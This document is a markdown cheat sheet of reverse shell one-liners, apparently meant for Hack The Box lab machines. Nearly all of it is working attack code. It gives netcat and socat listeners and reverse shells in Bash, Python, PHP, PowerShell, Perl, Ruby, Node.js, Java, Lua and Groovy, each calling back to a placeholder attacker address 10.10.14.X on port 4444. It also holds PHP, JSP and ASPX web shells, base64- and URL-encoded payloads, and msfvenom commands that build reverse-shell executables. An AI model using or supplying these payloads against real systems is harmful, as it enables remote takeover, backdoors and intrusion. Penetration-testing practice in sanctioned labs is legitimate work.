# Reverse Shell Cheatsheet

Quick reference for reverse shell one-liners commonly used in HTB machines.

## Listeners

```bash
# Netcat
nc -lvnp 4444
rlwrap nc -lvnp 4444

# Socat (fully interactive)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# pwncat-cs (auto-upgrade)
pwncat-cs -lp 4444
```

## Bash

```bash
bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'
```

## Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.X",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

## PHP

```php
php -r '$sock=fsockopen("10.10.14.X",4444);exec("bash <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.14.X",4444);$proc=proc_open("bash",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

## PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.X',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Perl

```perl
perl -e 'use Socket;$i="10.10.14.X";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
```

## Ruby

```ruby
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.X",4444))'
```

## Node.js

```javascript
require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.X/4444 0>&1"')
```

## Java (Runtime)

```java
Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.X/4444 0>&1"});
```

## Lua

```lua
os.execute("bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'")
```

## Groovy (Jenkins)

```groovy
String host="10.10.14.X";int port=4444;String cmd="bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```

## Upgrading to Interactive Shell

```bash
# Step 1: Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell
# Press Ctrl+Z

# Step 3: Configure terminal
stty raw -echo; fg

# Step 4: Set environment
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 cols 160
```

## Web Shells

```php
# PHP one-liner
<?php system($_GET['cmd']); ?>

# PHP with POST
<?php echo shell_exec($_POST['cmd']); ?>
```

```jsp
<!-- JSP -->
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```aspx
<!-- ASPX -->
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c " + Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd()%>
```

## Encoded Payloads

```bash
# Base64 encode bash reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1' | base64
# Then decode and execute
echo <base64_string> | base64 -d | bash

# URL-encoded bash
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.X%2F4444%200%3E%261%27

# PowerShell Base64
$text = '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.X",4444)...'
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text))
powershell -enc <base64_string>
```

## MSFVenom Payloads

```bash
# Linux x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f elf -o shell.elf

# Windows x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f exe -o shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=10.10.14.X LPORT=4444 -f raw > shell.php

# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f aspx -o shell.aspx

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.X LPORT=4444 -f war -o shell.war

# Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.X LPORT=4444 -f raw
```
